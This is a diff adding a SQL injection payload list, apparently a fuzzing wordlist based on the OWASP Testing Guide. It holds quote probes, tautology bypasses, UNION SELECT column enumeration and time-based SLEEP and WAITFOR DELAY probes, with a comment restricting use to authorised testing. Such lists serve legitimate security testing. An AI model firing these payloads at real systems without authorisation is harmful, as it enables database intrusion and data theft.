@@ -1,0 +1,46 @@
+# SQLi Test Vectors — OWASP Testing Guide
+# Format: one payload per line, lines starting with # are comments
+# Use only against systems you are authorised to test.
+
+'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+\\
+;
+' or '1'='1
+' or '1'='1'--
+' or '1'='1'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or ('1'='1
+') or ('1'='1'--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' GROUP BY 1,2--
+1' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+1' UNION SELECT NULL,NULL,NULL--
+' AND 1=1--
+' AND 1=2--
+' AND SLEEP(3)--
+'; WAITFOR DELAY '0:0:3'--
+1; SELECT SLEEP(3)
+1 AND SLEEP(3)
+' OR SLEEP(3)--
+' OR 1=1 LIMIT 1--
+' HAVING 1=1--
+' HAVING 1=2--
+1' AND '1'='1
+1' AND '1'='2
+0x27
+char(39)
+char(39)||char(39)
